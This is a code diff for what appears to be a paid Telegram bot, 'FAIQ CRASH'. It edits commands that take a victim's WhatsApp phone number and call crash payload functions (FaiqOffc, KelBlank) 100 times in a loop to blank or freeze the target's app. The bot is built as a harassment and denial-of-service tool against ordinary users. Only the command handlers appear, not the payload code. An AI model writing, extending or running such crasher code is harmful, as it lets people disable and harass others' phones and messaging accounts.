@@ -2175,10 +2175,9 @@ bot.command("FaiqxRaraForceInvis", checkWhatsAppConnection, checkPremium, checkC
   });
 });
 
-
-bot.command("FaiqxRaraBlankV2", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+bot.command("FaiqxRaraBlank", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
-  if (!q) return ctx.reply(`🪧 ☇ Format: /FaiqxRaraBlank 62×××`);
+  if (!q) return ctx.reply(`🪧 ☇ Format: /FaiqxRaraCrash 62×××`);
   let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
   let mention = false;
 
@@ -2201,7 +2200,7 @@ bot.command("FaiqxRaraBlankV2", checkWhatsAppConnection, checkPremium, checkCool
 
     for (let i = 0; i < 100; i++) {
    await FaiqOffc(target);
-   await sleep(1000);
+   await sleep(2000);
   }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
@@ -2219,8 +2218,9 @@ bot.command("FaiqxRaraBlankV2", checkWhatsAppConnection, checkPremium, checkCool
   });
 });
 
+bot.command("FaiqxRaraBlankV2", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
-  if (!q) return ctx.reply(`🪧 ☇ Format: /FaiqxRaraBlank 62×××`);
+  if (!q) return ctx.reply(`🪧 ☇ Format: /FaiqxRaraCrash 62×××`);
   let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
   let mention = false;
 
@@ -2229,7 +2229,7 @@ bot.command("FaiqxRaraBlankV2", checkWhatsAppConnection, checkPremium, checkCool
 <blockquote>⬡═―—⊱ ⎧ F A I Q C R A S H ⎭ ⊰―—═⬡
 
 ☐ Target: ${q}
-☐ Type: Blank Andro
+☐ Type: Blank Hard
 ☐ Status: Process</blockquote>`,
     parse_mode: "HTML",
     reply_markup: {
@@ -2243,14 +2243,14 @@ bot.command("FaiqxRaraBlankV2", checkWhatsAppConnection, checkPremium, checkCool
 
     for (let i = 0; i < 100; i++) {
    await KelBlank(target, type);
-   await sleep(1000);
+   await sleep(2000);
   }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
 <blockquote>⬡═―—⊱ ⎧ F A I Q C R A S H ⎭ ⊰―—═⬡
 
 ☐ Target: ${q}
-☐ Type: Blank Andro
+☐ Type: Blank Hard
 ☐ Status: Success</blockquote>`, {
     parse_mode: "HTML",
     reply_markup: {
